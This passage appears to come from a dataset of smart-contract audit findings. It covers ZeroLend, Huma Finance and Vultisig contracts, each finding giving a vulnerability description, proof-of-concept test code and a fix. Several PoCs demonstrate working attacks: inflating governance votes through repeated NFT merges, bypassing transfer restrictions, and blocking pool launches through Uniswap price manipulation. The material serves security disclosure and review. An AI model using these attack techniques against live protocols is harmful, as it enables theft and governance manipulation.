The client fixed the issue in commit: c1e1fba2e1958f6a41d9b573ec6133a684260892",Ember,Zokyo,HIGH,,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Zokyo/2023-10-20-Ember.md,,,solodit_reports,,2024-09-13 02:14:46,2024-10-15 00:45:13,1,,
1836148,4cddbb3d6ac4b37d479a9c8036a3b2ed,The main functionality of the contract `EarlyZEROVesting` does not work due to a missing approval,Immunefi,2024-03-12,"Report type: Smart Contract


Target: https://github.com/zerolend/governance

Impacts:
- Protocol insolvency
- Protocol contract does not work

## Description
## Brief/Intro
The function `EarlyZEROVesting::startVesting` is broken due to missing allowances between contracts.


## Vulnerability Details

The problem is in the following function call in the `startVesting` function:
```solidity
uint256 id = vesting.mint(
            stake ? address(this) : msg.sender, // address _who,
            (amount * 75) / 100, // uint256 _pending,
            (amount * 25) / 100, // uint256 _upfront,
            86400 * 30 * 3, // uint256 _linearDuration,
            86400 * 30, // uint256 _cliffDuration,
            block.timestamp, // uint256 _unlockDate,
            false, // bool _hasPenalty
            IVestedZeroNFT.VestCategory.EARLY_ZERO
);
```
Inside the `VestedZeroNFT::mint`, almost the last line contains the following call:
```solidity
zero.transferFrom(msg.sender, address(this), _pending + _upfront);
```
Where `msg.sender == EarlyZEROVesting`.

 Because there is no allowance set `from == EarlyZEROVesting` to `spender == VestedZeroNFT`, the **TX will always revert** (`IERC20Errors.ERC20InsufficientBalance`)

------

This approval is necessary for the function `EarlyZEROVesting::startVesting`:
```solidity
function startVesting(uint256 amount, bool stake) external { 
    require(enableVesting || stake, ""vesting not enabled; staking only"");
    earlyZERO.burnFrom(msg.sender, amount);
    
    // Approve call here is necessary
    earlyZERO.approve(address(vesting),amount);
    ...
```


## Impact Details
The main functionality of the contract `EarlyZEROVesting`, which is `startVesting` is broken and always reverts

## References
PoC and .png shows the problem



## Proof of Concept

### Test
#### tests/test_vested.py
```python
from wake.testing import *

from pytypes.openzeppelin.contracts.proxy.ERC1967.ERC1967Proxy import ERC1967Proxy
from pytypes.contracts.locker.OmnichainStaking import OmnichainStaking
from pytypes.contracts.locker.LockerToken import LockerToken
from pytypes.contracts.locker.LockerLP import LockerLP
from pytypes.tests.VeToken import VeToken


from pytypes.contracts.vesting.earlyzero.EarlyZEROVesting import EarlyZEROVesting
from pytypes.contracts.vesting.earlyzero.EarlyZERO import EarlyZERO
from pytypes.contracts.vesting.VestedZeroNFT import VestedZeroNFT
from pytypes.contracts.vesting.StakingBonus import StakingBonus

'''
Test written in Wake testing framework (https://getwake.io/) aka boosted brownie

Docs: 
https://ackeeblockchain.com/wake/docs/latest/

Repo:
https://github.com/Ackee-Blockchain/wake

How to run this test:

Install wake
    $ pip install eth-wake

To have actual anvil version
    $ foundryup

After installing project dependencies initialize wake
It will create `tests` folder and process foundry remappings if any
    $ wake up

Generate python representation of contracts
    $ wake init pytypes

Go to wake `tests` folder and paste this code in tests/test_vested.py and run
    $ wake test tests/test_vested.py

'''


def deploy_with_proxy(contract):
    impl = contract.deploy()
    proxy = ERC1967Proxy.deploy(impl, b"""")
    return contract(proxy)

# Print failing tx call trace
def revert_handler(e: TransactionRevertedError):
    if e.tx is not None:
        print(e.tx.call_trace)
        print(e.tx.events)

@default_chain.connect()
@on_revert(revert_handler)
def test_vested():
    # ======================DEPLOY========================= #
    random  = default_chain.accounts[9]
    owner   = default_chain.accounts[0]
    bob     = default_chain.accounts[1]
    
    # Deploy mock token
    zero_token = EarlyZERO.deploy(from_=owner)
    ve_token = VeToken.deploy(100*10**18, from_=bob)
    
    # Proxy deployment
    zero_vesting = deploy_with_proxy(EarlyZEROVesting)
    omnichain = deploy_with_proxy(OmnichainStaking)
    staking_bonus = deploy_with_proxy(StakingBonus)
    vested_zero_nft = deploy_with_proxy(VestedZeroNFT)
    locker_lp = deploy_with_proxy(LockerLP)
    locker_token = deploy_with_proxy(LockerToken)
    
    # Init deployment
    zero_vesting.init(zero_token, vested_zero_nft, staking_bonus, from_=owner)
    omnichain.init(random, locker_token, locker_lp, from_=owner)
    staking_bonus.init(zero_token, locker_token, vested_zero_nft, 100, from_=owner)
    vested_zero_nft.init(zero_token, staking_bonus, from_=owner)
    locker_lp.init(ve_token, omnichain, random, from_=owner)
    locker_token.init(ve_token, omnichain, random, from_=owner)
    # Send something to bob
    zero_token.transfer(bob, 100*10**18, from_=owner)
    zero_token.transfer(zero_vesting, 100*10**18, from_=owner)
    # Disable whitelist and blacklist
    zero_token.toggleWhitelist(False, False, from_=owner)
    zero_token.approve(zero_vesting, 100*10**18, from_=bob)
    print(vested_zero_nft.address)
    print(zero_vesting.address)
    #zero_token.approve(vested_zero, 100*10**18, from_=zero_vesting)

    zero_vesting.toggleVesting(from_=owner)
    zero_vesting.startVesting(100*10**18, True, from_=bob)

    # Just simply run test
    # On-revert handler will print call trace and errors of the reverting TX


```",ZeroLend,stiglitz,HIGH,,,0,0,0,https://raw.githubusercontent.com/immunefi-team/Bounty_Boosts/main/ZeroLend/29270%20-%20%5bSC%20-%20High%5d%20The%20main%20functionality%20of%20the%20contract%20EarlyZER....md,,,https://immunefi.com/bounty/zerolend-boost/,solodit_reports,,2024-09-24 01:30:18,2024-10-15 01:30:42,1,,
1836299,271495464f6322a8cf83e415a0346226,It is impossible to claim rewards in zlrewardscontroller.sol,Cantina,2024-01-25,"Context: ZLRewardsController.sol#L484
Description: ZLRewarsController contract is responsible for storing reward bearing tokens 'data, users'
data and allocation percentages for different tokens. All reward bearing tokens earn some rewards based
on accumulated rewards per token.
Users get proportional amount of rewards by holding these reward bearing tokens, and they can claim
their reward with the ZLRewardsController.claim() function.
However, this function will always revert. Let 's examine said function:
function claim(
address _user,
address[] memory _tokens
) public whenNotPaused {
// SKIPPED FOR BREVITY
_vestTokens(_user, pending);
}
The claim function performs some checks and actions ( calculates reward debt and user pending reward etc ),
and then calls the _vestTokens function.
function _vestTokens(address _user, uint256 _amount) internal {
if (_amount == 0) revert NothingToVest();
streamedVesting.createVestFor(_user, _amount); //@audit-issue streamedVesting contract will try to burn
vestedTokens from this contract. This contract never approved the StreamedVesting contract ,→
}
The _vestTokens function then will call the streamedVesting.createVestFor function, which uses the
msg.sender as the from address, and the msg.sender is the ZLRewardsController contract.
function createVestFor(address to, uint256 amount) external whenNotPaused {
_createVest(msg.sender, to, amount); //@audit msg.sender is ZLRewardsController contract
}
function _createVest(
address from,
address to,
uint256 amount
) internal whenNotPaused {
vestedToken.burnFrom(from, amount); //@audit-issue ""from"" is ZLRewardsController contract. That contract
is never approved StreamedVesting as ""spender"" ,→
lastId++;
// SKIPPED FOR BREVITY
}
As we can see above, the ﬁrst step during the _createVest function is burning vestedToken s from the
""from"" address (which is ZLRewardsController ) with this line: vestedToken.burnFrom(from, amount);
vestedToken is an ERC20Burnable , and let's check the burnFrom function in the OpenZeppelin implemen-
tation:
function burnFrom(address account, uint256 value) public virtual {
_spendAllowance(account, _msgSender(), value);
_burn(account, value);
}
4
As we can see here, it requires allowance. ZLRewardsControoler.claim() will always revert with
ERC20InsuﬃcientAllowance error.
ZLRewardsController contract MUST approve the StreamedVesting contract as spender for this claim func-
tionality to work.
Similar approvals are made in this protocol at StreamedVesting.sol#L56 ( streamedVesting approves the
ZeroLocker contract as spender) and at BonusPool.sol#L24 ( bonusPool approves the sreamedVesting con-
tract as spender) during initialization.
Likelihood is high as it will always happen. Impact is high since this is one of the core functions and the
reward mechanism of the protocol is totally broken, which makes it a critical issue.
Proof of concept:
Before running the test we need to do a slight change in the protocol 's ﬁxture. We are going to change
the pool conﬁgurator to make testing easier. Perform the change below in the test/fixtures/core.ts
test ﬁle:
await zLRewardsController.initialize(
- lending.configurator.target, // address _poolConfigurator,
+ owner.address, // address _poolConfigurator,
vesting.target, // IStreamedVesting _streamedVesting,
locker.target, // IZeroLocker _locker,
1000, // uint256 _rewardsPerSecond,
token.target, // address _rdntToken,
0 // uint256 _endingTimeCadence
);
After changing these lines, do the following steps:
•Create an empty ﬁle in the test folder and name it something.ts .
•Copy and paste the snippet below into the newly created ﬁle.
•Run it with npx hardhat test --grep ""Always reverts when claiming"" .
import { expect } from ""chai"";
import { ethers } from ""hardhat"";
import {
loadFixture,
time,
} from ""@nomicfoundation/hardhat-toolbox/network-helpers"";
import { e18, deployCore as fixture } from ""./fixtures/core"";
describe(""RewardsController"", () => {
it(""Always reverts when claiming"", async function () {
const {
token: rewardToken,
vestedToken,
owner,
zLRewardsController,
otherAccount: user,
} = await loadFixture(fixture);
// First, transfer some vestedToken token to zlRewardsController address.
// StreamedVesting contract will try to burn them from ""zlRewardsController"" during claim.
await vestedToken.transfer(zLRewardsController, e18 * 100000000n);
// Configurator adds pool to the contract (configurator is owner).
// Note: I used regular token as rewardToken here instead of deploying a new mock token to make
testing easier. ,→
await zLRewardsController.connect(owner).addPool(rewardToken, e18 * 100000n);
expect(await zLRewardsController.poolLength()).eq(1);
// Owner registers reward deposit and starts.
await zLRewardsController.connect(owner).registerRewardDeposit(e18 * 100000000n);
await zLRewardsController.connect(owner).start();
// Transfer some reward tokens to user and register the user. ""afterLockUpdate"" function will register
the user ,→
await rewardToken.transfer(user.address, e18 * 100n);
await zLRewardsController.afterLockUpdate(user.address);
5
// fast forward time
await time.increase(86400 * 30 * 3);
// Check user ' s pending reward
const pendingReward = await zLRewardsController.allPendingRewards(user.address);
expect(pendingReward).greaterThan(0);
console.log(""pend: "", pendingReward);
// ----------------------ACTION----------------
// User tries to claim.
// It will revert with insufficient allowance error
expect(zLRewardsController.connect(user).claimAll(user.address)).revertedWith(""ERC20: insufficient
allowance""); ,→
});
});
Recommendation: Approve the streamedVesting contract as spender during initialize.
+ // Inside the initialize
+ vestedToken.approve(address(steamedVesting), type(uint256).max)",ZeroLend,bin2chen|tnch|shaka|osmanozdemir1|0xarno|Sujith Somraaj|0xhashiman|elhaj|waﬄemakr|Federico Bianucci|pauleth|Naveen Kumar J - 1nc0gn170|jovi.eth|Chinmay Farkya,HIGH,,,5,0,0,,https://cdn.cantina.xyz/reports/cantina_competition_zerolend_jan2024.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/cantina/cantina_competition_zerolend_jan2024.pdf,https://cantina.xyz/portfolio/6d383aaf-8554-4a06-a224-86189f81f531,solodit_reports,,2024-10-04 01:09:49,2024-10-15 01:10:56,1,,
1836300,9f2cc246520338db6414e7a38f653c9f,A malicious user can inﬂate his voting power via merge(),Cantina,2024-01-25,"Context: ZeroLocker.sol#L711
Description: The merge function in the ZeroLocker contract is intended to allow users to consolidate their
stakes by merging multiple NFTs into one. However, this function can be exploited to artiﬁcially inﬂate
the voting power of an NFT, which can then be used to manipulate ongoing governance proposals.
An external contract will call the function balanceOfNFT to get the voting power for a speciﬁc tokenId ,
when a user attempt to vote with this token:
7
function balanceOfNFT(uint256 _tokenId) external view override returns (uint256) {
if (ownershipChange[_tokenId] == block.number) return 0;
return _balanceOfNFT(_tokenId, block.timestamp);
}
function _balanceOfNFT(uint256 _tokenId, uint256 _t) internal view returns (uint256) {
uint256 _epoch = userPointEpoch[_tokenId];
if (_epoch == 0) {
return 0;
} else {
Point memory lastPoint = _userPointHistory[_tokenId][_epoch];
lastPoint.bias -= lastPoint.slope * int128(int256(_t) - int256(lastPoint.ts));
if (lastPoint.bias < 0) {
lastPoint.bias = 0;
}
return uint256(int256(lastPoint.bias));
}
}
A malicious user with multiple NFTs locked in the ZeroLocker contract can execute a series of merges to
move their voting power into a multiple NFTs. By merging a larger-staked NFT into a smaller one, the user
can increase the bias of the smaller NFT. The user can then use this newly merged NFT to vote and pass a
malicious proposal, effectively using the same stake to vote multiple times. The process can be repeated
by merging the inﬂated NFT into another small-staked NFT, further increasing its bias and using it to vote
again.which can be done in the same transaction.
Proof of concept:
1. Bob creates multiple locks in the ZeroLocker contract, with one major lock holding a signiﬁcant
amount of zeroToken and several smaller locks with minimal amounts.
2. After some time, Bob begins the exploitation process by voting with the major lock.
3. Bob then merges the major lock into one of the smaller locks using the merge function, which in-
creases the bias of the smaller lock due to the added tokens from the major lock.
4. With the inﬂated bias of the newly merged lock, Bob votes again, effectively using the same tokens
to increase his voting power.
5. Bob repeats this process, merging the inﬂated lock with another small lock and voting again, further
increasing his voting power each time.
This vulnerability allows a single user to have an outsized inﬂuence on the outcome of governance deci-
sions.
Check this code implementation that shows how Bob could inﬂate his voting power by merging:
contract setup is Test {
uint constant supply = 1000000000 ether;
BonusPool bonus;
VestedZeroLend vestToken;
VestedZeroLend zeroToken;
ZeroLocker locker;
FeeDistributor feeDistributor;
StakingEmissions emissions;
StreamedVesting vest;
function setUp() public virtual {
// deploy zero token :
zeroToken = new VestedZeroLend();
// deploy vest token :
vestToken = new VestedZeroLend();
// deploy locker :
locker = new ZeroLocker();
locker.initialize(address(zeroToken));
// deploy feedistributer :
feeDistributor = new FeeDistributor();
feeDistributor.initialize(address(locker), address(vestToken));
// deploy emissions :
emissions = new StakingEmissions();
emissions.initialize(feeDistributor, vestToken, 100_000 ether);
// deploy vest :
vest = new StreamedVesting();
8
// deploy bonus pool :
bonus = new BonusPool(zeroToken, address(vest));
vest.initialize(zeroToken, IERC20Burnable(address(vestToken)), locker, bonus);
// initial balances :
zeroToken.transfer(address(bonus), 5 * supply);
zeroToken.transfer(address(vest), 55 * supply);
vestToken.transfer(address(emissions), 50 * supply);
vestToken.addwhitelist(address(emissions), true);
vestToken.addwhitelist(address(feeDistributor), true);
// disable whitelist from the zero token:
zeroToken.toggleWhitelist(false, false);
// start vesting and emissions :
skip(3 days);
vest.start();
emissions.start();
}
address bob = makeAddr(""bob"");
uint votingPower;
// simulate the voting behavior :
function vote(uint tokenId) public {
// this calls the locker contract to get the voting power of the token id :
votingPower += locker.balanceOfNFT(tokenId);
}
function test_votingPower() public {
zeroToken.transfer(bob, 10000 ether);
vm.startPrank(bob);
zeroToken.approve(address(locker), 1000 ether);
//bob create one normal lock, and 9 tiny :
uint[11] memory tokenIds;
for (uint i; i < 10; i++) {
if (i == 0) {
// the first lock will be the major one with the biggest amount that will be moved over others to
inflate the voting power: ,→
tokenIds[i] = locker.createLock(100 ether, 20 weeks);
continue;
}
// tiny locks starting from index 2 => 10:
tokenIds[i] = locker.createLock(100, 20 weeks);
}
skip(3 weeks); // just skip 3 weeks
// catch the real voting power if bob not malicious this will be his real voting power :
for (uint i; i < 9; i++) {
// uninflated voting power :
vote(tokenIds[i]);
}
uint uninflatedVotingPower = votingPower; // catch the real voting power
// reset the voting power to calculate the inflated voting power when bob malicious:
votingPower = 0;
for (uint i; i < 9; i++) {
// vote with majore lock:
vote(tokenIds[i]);
locker.merge(tokenIds[i], tokenIds[i + 1]);
}
// compare the inflated voting power ,and the actual voting power :
console.log(""inflated voting power => "", votingPower);
console.log(""the real voting power => "", uninflatedVotingPower);
console.log(""the inflated amount => "", votingPower - uninflatedVotingPower);
}
}
Output:
[PASS] test_votingPower() (gas: 4794558)
Logs:
inflated voting power => 71506842180354954054
the real voting power => 7945204686706106006
the inflated amount => 63561637493648848048
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.75ms
The vulnerability enables a user to multiply their vote unfairly, potentially tipping the scales in favor of
harmful proposals and disrupting fair governance.
9
Recommendation: Update the merge function to record a change in the ownershipChange mapping for
the toNFT:
function merge(uint256 _from, uint256 _to) external override {
// prev code .....
_depositFor(_to, value0, end, _locked1, DepositType.MERGE_TYPE);
+ ownershipChange[_to] = block.timestamp;
}",ZeroLend,elhaj,HIGH,,,8,0,0,,https://cdn.cantina.xyz/reports/cantina_competition_zerolend_jan2024.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/cantina/cantina_competition_zerolend_jan2024.pdf,https://cantina.xyz/portfolio/6d383aaf-8554-4a06-a224-86189f81f531,solodit_reports,,2024-10-04 01:09:49,2024-10-15 01:10:56,1,,
1865547,0cc80ce63d4737ae190efde904f20509,Restriction of transfer can be circumvented by using approve + transferFrom,Spearbit,2024-03-12,"Severity: High Risk
Context: TrancheVault.sol#L494, FirstLossCover.sol#L271
Description: In TrancheVault and FirstLossCover , transfer is disabled. However, those inherits from
ERC20Upgradeable which includes approve and transferFrom functions that can circumvent this restriction.
Here are the following issues that may arise through the use of approve + transferFrom :
1. TrancheVault shares, intended only for addresses with the LENDER_ROLE , can be sent to an address without
this role. A trustless smart contract can be built to make this functionality available as well.
2. The checkLiquidityRequirementForRedemption check can be bypassed by approving and calling trans-
ferFrom() to a new account not associated with poolOwnerTreasury or evaluationAgent , followed by re-
deeming these shares.
3. Lender's principal amount can be converted into yield which is readily redeemable, circumventing the re-
demption process. This is done by transferring the principal amount from a reinvesting lender's account to
a non-reinvesting lender's account. The excess amount is treated as yield by the processYieldForLenders
function.
Recommendation: Consider disabling the transferFrom function as well.
Huma: Fixed in PR 387 and PR 384.
Spearbit: Fixed.",Huma Finance,Saw-Mon and Natalie|Jonatas Martins|0xLeastwood|Kankodu,HIGH,,,6,0,0,,https://github.com/spearbit/portfolio/blob/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Huma-2024-Spearbit-Security-Review.pdf,https://github.com/spearbit/portfolio/blob/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf,solodit_reports,f6b7f3a3c3440be8feab4a9285236eab,2024-08-09 01:29:27,2024-10-15 01:30:42,1,,
1865608,de6e8d4ca468e96f642b2216312e1fc6,[H-01] Most users won't be able to claim their share of Uniswap fees,Code4rena,2024-06-14,"Users should be able to claim Uniswap fees for their current liquidity position regardless of their pending vestings, or cliff. But most users won't be able to claim those Uniswap fees.

It is also possible that they won't be able to claim their vesting if they accumulate sufficient unclaimed Uniswap fees.

### Vulnerability Details

The root issue is that the `claim()` function collects ALL the owed tokens at once, including the ones from the burnt liquidity, but also the fees corresponding to ALL positions:

```solidity
    (uint128 amountCollected0, uint128 amountCollected1) = pool.collect(
        address(this),
        TICK_LOWER,
        TICK_UPPER,
@>      type(uint128).max,
@>      type(uint128).max
    );
```

<https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L246-L247>

Then the platform fees are sent alongside the Uniswap fees from the users that still didn't claim `amountCollected - amount`:

```solidity
TransferHelper.safeTransfer(_cachedPoolKey.token0, feeTaker, amountCollected0-amount0);
TransferHelper.safeTransfer(_cachedPoolKey.token1, feeTaker, amountCollected1-amount1);
```

<https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L252-L260>

The next time a user calls `claim()`, `pool.collect()` will not contain any Uniswap fees as all of them have already been claimed and sent to the first claimer and the rest to the fee taker. If the platform fees are enough to cover the owed fees for the claiming user, the transaction might succeed (this may be possible if the burnt liquidity is enough).

As time passes, more fees will be accumulated, and when Uniswap fees `>` platform fees, the transaction will also revert even for unclaimed vestings with liquidity to burn. In addition, in most cases after the initial vesting, users won't be able to claim Uniswap fees, as no fees will be collected, and the contract doesn't hold those assets (they have been sent to the fee taker).

### Proof of Concept

This POC shows how after one user claims their share of the fees, there are no more fee tokens to collect for the next claims, and the transactions revert.

1. Add the import to the top of `test/ILOPool.t.sol`.
2. Add the test to the `ILOPoolTest` contract in `test/ILOPool.t.sol`.
3. Run `forge test --mt testClaimFeesRevert`.

```solidity
import '../lib/v3-core/contracts/interfaces/IUniswapV3Pool.sol';
```

```solidity
function testClaimFeesRevert() external {
    _launch();
    vm.warp(VEST_START_0 + 10);

    uint256 tokenId = IILOPool(iloPool).tokenOfOwnerByIndex(INVESTOR, 0);
    uint256 tokenId2 = IILOPool(iloPool).tokenOfOwnerByIndex(INVESTOR_2, 0);

    IUniswapV3Pool uniV3Pool = IUniswapV3Pool(projectId);

    // INVESTOR and INVESTOR_2 burn their liquidity and obtain their tokens

    vm.prank(INVESTOR);
    IILOPool(iloPool).claim(tokenId);

    vm.prank(INVESTOR_2);
    IILOPool(iloPool).claim(tokenId2);

    // Generate some fees via a flash loan
    uniV3Pool.flash(address(this), 1e8, 1e8, """");

    // INVESTOR claims their corresponding part of the fees
    // Only the first one to claim has better odds of claiming successfully
    vm.prank(INVESTOR);
    IILOPool(iloPool).claim(tokenId);

    // INVESTOR_2 can't claim their part of the fees as the transaction will revert
    // It reverts with ST (SafeTransfer) as it is trying to transfer tokens the contract doesn't have
    // The fees for INVESTOR_2 were already taken
    vm.prank(INVESTOR_2);
    vm.expectRevert(bytes(""ST""));
    IILOPool(iloPool).claim(tokenId2);

    // Generate more fees
    uniV3Pool.flash(address(this), 1e6, 1e6, """");

    // Even if some new fees are available, they might not be enough to pay back the owed ones to INVESTOR_2
    vm.prank(INVESTOR_2);
    vm.expectRevert(bytes(""ST""));
    IILOPool(iloPool).claim(tokenId2);
}

function uniswapV3FlashCallback(uint256, uint256, bytes memory) external {
    deal(USDC, address(this), IERC20(USDC).balanceOf(address(this)) * 2);
    deal(SALE_TOKEN, address(this), IERC20(SALE_TOKEN).balanceOf(address(this)) * 2);

    IERC20(USDC).transfer(projectId, IERC20(USDC).balanceOf(address(this)));
    IERC20(SALE_TOKEN).transfer(projectId, IERC20(SALE_TOKEN).balanceOf(address(this)));
}
```

### Recommended Mitigation Steps

Here's an suggestion on how this could be solved. The idea is to only `collect()` the tokens corresponding to the liquidity of the `tokenId` position. So that the next user can also claim their share.

```diff
    function claim(uint256 tokenId) external payable override isAuthorizedForToken(tokenId)
        returns (uint256 amount0, uint256 amount1)
    {
+       uint128 collect0;
+       uint128 collect1;

        uint128 liquidity2Claim = _claimableLiquidity(tokenId);
        IUniswapV3Pool pool = IUniswapV3Pool(_cachedUniV3PoolAddress);
        {
            IILOManager.Project memory _project = IILOManager(MANAGER).project(address(pool));
            uint128 positionLiquidity = position.liquidity;

            // get amount of token0 and token1 that pool will return for us
            (amount0, amount1) = pool.burn(TICK_LOWER, TICK_UPPER, liquidity2Claim);

+           collect0 = amount0;
+           collect1 = amount1;

            // get amount of token0 and token1 after deduct platform fee
            (amount0, amount1) = _deductFees(amount0, amount1, _project.platformFee);

            ...

            uint256 fees0 = FullMath.mulDiv(
                            feeGrowthInside0LastX128 - position.feeGrowthInside0LastX128,
                            positionLiquidity,
                            FixedPoint128.Q128
                        );
            
            uint256 fees1 = FullMath.mulDiv(
                                feeGrowthInside1LastX128 - position.feeGrowthInside1LastX128,
                                positionLiquidity,
                                FixedPoint128.Q128
                            );

+           collect0 += fees0;
+           collect1 += fees1;

            // amount of fees after deduct performance fee
            (fees0, fees1) = _deductFees(fees0, fees1, _project.performanceFee);

            ...
        }

        (uint128 amountCollected0, uint128 amountCollected1) = pool.collect(
            address(this),
            TICK_LOWER,
            TICK_UPPER,
-           type(uint128).max,
-           type(uint128).max
+           collect0,
+           collect1
        );
        
        ...
    }
```

### Assessed type

Uniswap

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-06-vultisig-findings/issues/43#issuecomment-2237661021):**
 > The Warden outlines an issue with the fee collection mechanism whenever a position is claimed that would result in the contract claiming more funds than the user is due and the fee taker acquiring this difference.
> 
> In turn, this will result in all consequent claim operations of other NFT IDs on the same tick range (i.e., the same pool) to fail potentially permanently due to being unable to capture the fee-related portion. I consider this to be a significant flaw and one that merits a high-risk severity rating.

**[Haupc (Vultisig) confirmed](https://github.com/code-423n4/2024-06-vultisig-findings/issues/43#event-13596542463)**

***",Vultisig,rbserver|Chinmay|juancito|Audinarey|KupiaSec|HChang26|Ryonen|crypticdefense|shaflow2|kennedy1030|Bigsam|rspadi|h2134|0x04bytes|tobi0x18,HIGH,,41600,0,0,0,https://github.com/code-423n4/2024-06-vultisig-findings/issues/43,https://code4rena.com/reports/2024-06-vultisig,,https://code4rena.com/reports/2024-06-vultisig,solodit_reports,5f46e08fbfc497c16415797d1333365b,2024-08-09 01:57:56,2024-10-15 02:01:13,1,"type(uint128).max,
            type(uint128).max
```
        TransferHelper.safeTransfer(_cachedPoolKey.token0, ownerOf(tokenId), amount0);
        TransferHelper.safeTransfer(_cachedPoolKey.token1, ownerOf(tokenId), amount1);

        emit Claim(ownerOf(tokenId), tokenId,liquidity2Claim, amount0, amount1, position.feeGrowthInside0LastX128, position.feeGrowthInside1LastX128);

        address feeTaker = IILOManager(MANAGER).FEE_TAKER();
        // transfer fee to fee taker
        TransferHelper.safeTransfer(_cachedPoolKey.token0, feeTaker, amountCollected0-amount0);
        TransferHelper.safeTransfer(_cachedPoolKey.token1, feeTaker, amountCollected1-amount1);",
1865613,8ecf168a482233da7c3fcabdb476de6a,[H-03] Adversary can prevent the launch of any ILO pool with enough raised capital at any moment by providing single-sided liquidity,Code4rena,2024-06-14,"<https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L296>

### Impact

It is possible to prevent the launch of any ILO pool at any time, including pools that have reached their total raised amount. This can be done at any time and the cost for the attacker is negligible.

Not only this is a DOS of the whole protocol, but the attack can be performed at the very end of the sale, making users lose a lot on gas fees, considering it will be deployed on Ethereum Mainnet. Hundreds or thousands of users will participate in ILO pools via `buy()`, and will have to later call `claimRefund()` to get their ""raise"" tokens back.

Token launches that were deemed to be successful will be blocked after raising funds from many users, and this will most certainly affect the perception of the token, and its pricing on any attempt of a future launch/sale.

### Vulnerability Details

The `ILOManager` contract has a check to assert that the price at the time of the token launch is the same as the one initialized by the project. If they differ the transaction will revert, and the token launch will fail:

```solidity
function launch(address uniV3PoolAddress) external override {
    require(block.timestamp > _cachedProject[uniV3PoolAddress].launchTime, ""LT"");
    (uint160 sqrtPriceX96, , , , , , ) = IUniswapV3Pool(uniV3PoolAddress).slot0();
@>  require(_cachedProject[uniV3PoolAddress].initialPoolPriceX96 == sqrtPriceX96, ""UV3P"");
    address[] memory initializedPools = _initializedILOPools[uniV3PoolAddress];
    require(initializedPools.length > 0, ""NP"");
    for (uint256 i = 0; i < initializedPools.length; i++) {
        IILOPool(initializedPools[i]).launch();
    }

    emit ProjectLaunch(uniV3PoolAddress);
}
```

<https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOManager.sol#L190>

The problem is that `sqrtPriceX96` can be easily manipulated in Uniswap v3 Pools when there is no liquidity in it via a swap with no cost. In theory, this could be mitigated by anyone by swapping back to get back to the original price. But there is an additional problem which makes the severity of the attack even higher. The attacker can add [single-sided liquidity](https://support.uniswap.org/hc/en-us/articles/20902968738317-What-is-single-sided-liquidity#:\~:text=When%20you%20select%20a%20range%20that%20is%20outside%20the%20current%20price%20range%2C%20you%20will%20only%20be%20able%20to%20supply%20one%20of%20the%20two%20tokens.) to the pool (just the Raise Token) after the price was manipulated.

> When you select a range that is outside the current price range, you will only be able to supply one of the two tokens.

By adding liquidity in ticks greater than the manipulated price, but lower than the expected initial price, it would require the swapper to provide some `SALE_TOKEN`, which should not be available at this moment, since they should all be in the ILO pool.

Even if the project admin has some `SALE_TOKEN`, the attacker can mint a higher amount of liquidity by providing more single-sided `RAISE_TOKEN` liquidity, making the needed amount of `SALE_TOKEN` even higher.

### Proof of Concept

The following Proof of Concept shows how an attacker can make a launch revert after raising capital, at the cost of providing liquidity with only `1 wei` of USDC (Raise Token).

Console Output:

    <<Minting Attack>>
    <<Failed mitigation attempt>>
      
    uniswapV3SwapCallback()
      amount0 (USDC)       0
      amount1 (SALE_TOKEN) 1

This would be enough to perform an attack that can't be reverted in most cases since no other sale tokens should be circulating before the launch. But for the sake of interest, the minted liquidity and the mitigation amount can be increased to check the values needed to get back to the initial price in different situations.

POC:

1. Add the import to the top of `test/ILOManager.t.sol`.
2. Add the test to the `ILOManagerTest` contract in `test/ILOManager.t.sol`.
3. Run `forge test --mt testManipulatePriceForLaunch -vv`.

<details>

```solidity
import ""../lib/v3-core/contracts/interfaces/IUniswapV3Pool.sol"";
import ""forge-std/console.sol"";
```

```solidity
function testManipulatePriceForLaunch() external {
    IILOManager.InitPoolParams memory params = _getInitPoolParams();
    _initPool(PROJECT_OWNER, params);

    assertEq(IUniswapV3Pool(projectId).token0(), USDC);
    assertEq(IUniswapV3Pool(projectId).token1(), SALE_TOKEN);

    vm.label(USDC, ""USDC"");
    vm.label(SALE_TOKEN, ""SALE_TOKEN"");
    vm.label(projectId, ""UNI_V3_POOL"");
    vm.label(address(this), ""ATTACKER"");

    unsuccessfulPriceManipulation();

    priceManipulationAttack();

    vm.warp(LAUNCH_START+1);
    vm.expectRevert(bytes(""UV3P""));
    iloManager.launch(projectId);
}

function unsuccessfulPriceManipulation() internal {
    uint160 initialPrice = mockProject().initialPoolPriceX96;
    uint160 MIN_SQRT_RATIO = 4295128739 + 1;

    // Check price before attack
    (uint160 sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), initialPrice);

    // Attack
    IUniswapV3Pool(projectId).swap(address(this), true, 1, MIN_SQRT_RATIO, """");
    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), MIN_SQRT_RATIO);

    // Mitigation
    IUniswapV3Pool(projectId).swap(address(this), false, 1, initialPrice, """");
    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), initialPrice);
}

function priceManipulationAttack() internal {
    uint160 initialPrice = mockProject().initialPoolPriceX96;
    uint160 MIN_SQRT_RATIO = 4295128739 + 1;

    // Check price before attack
    (uint160 sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), initialPrice);

    // Attack -> Swap to manipulate price
    IUniswapV3Pool(projectId).swap(address(this), true, 1, MIN_SQRT_RATIO, """");
    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), MIN_SQRT_RATIO);

    // Attack -> Mint to prevent swapping back
    console.log(""\n<<Minting Attack>>"");
